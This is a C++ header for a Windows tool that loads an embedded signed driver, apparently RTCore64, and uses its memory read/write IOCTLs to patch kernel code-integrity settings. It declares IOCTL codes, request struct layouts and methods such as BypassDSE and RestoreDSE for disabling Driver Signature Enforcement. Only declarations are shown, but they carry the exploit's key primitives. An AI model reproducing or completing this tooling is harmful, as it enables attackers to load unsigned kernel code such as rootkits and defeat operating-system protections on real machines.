#pragma once

#include <windows.h>
#include <cstdint>
#include <optional>
#include "SymbolDownloader.h"

constexpr DWORD RTC_IOCTL_MEMORY_READ = 0x80002048;
constexpr DWORD RTC_IOCTL_MEMORY_WRITE = 0x8000204C;

struct alignas(8) RTC_MEMORY_READ {
    BYTE Pad0[8];
    uint64_t Address;
    BYTE Pad1[8];
    uint32_t Size;
    uint32_t Value;
    BYTE Pad3[16];
};

struct alignas(8) RTC_MEMORY_WRITE {
    BYTE Pad0[8];
    uint64_t Address;
    BYTE Pad1[8];
    uint32_t Size;
    uint32_t Value;
    BYTE Pad3[16];
};

class DrvLoader {
public:
    HANDLE hDriver{ INVALID_HANDLE_VALUE };
    std::optional<uint64_t> originalCallback;
    SymbolDownloader symbolDownloader;

    // Embedded resource data pointer (set by caller before use)
    const BYTE* embeddedResourceData = nullptr;
    size_t embeddedResourceSize = 0;

    bool GetSymbolOffsets(uint64_t* seCiCallbacks, uint64_t* safeFunction);
    std::optional<std::pair<uint64_t, uint64_t>> ResolveKernelOffsetsStrict();
    bool ValidateKernelAddresses(uint64_t ntBase, uint64_t seCiRva, uint64_t zwRva);
    std::optional<std::pair<uint64_t, uint64_t>> GetTextSectionBounds(const std::wstring& ntoskrnlPath);

    bool Initialize();
    void Cleanup();

    bool WriteMemory32(uint64_t address, uint32_t value);
    bool WriteMemory64(uint64_t address, uint64_t value);
    std::optional<uint32_t> ReadMemory32(uint64_t address);
    std::optional<uint64_t> ReadMemory64(uint64_t address);

    bool CheckDSEStatus(bool& isPatched);
    bool BypassDSE();
    bool RestoreDSE();
    bool DisableDSEStandard();
    bool RestoreDSEStandard();

private:
    std::optional<uint64_t> GetNtoskrnlBase();
    std::optional<uint64_t> GetKernelSymbolOffset(const std::wstring& symbolName);

    bool InstallAndStartDriver();
    bool StopAndRemoveDriver();
    void DeleteDriverFile();
    bool CheckDriverFileExists();

    bool BypassDSEInternal();
    bool RestoreDSEInternal();

    std::optional<uint64_t> FindCiDllBase();
    std::optional<uint64_t> FindCiOptionsAddress();

    uint64_t m_ciOptionsAddr = 0;
    uint32_t m_originalCiOptions = 0;
};
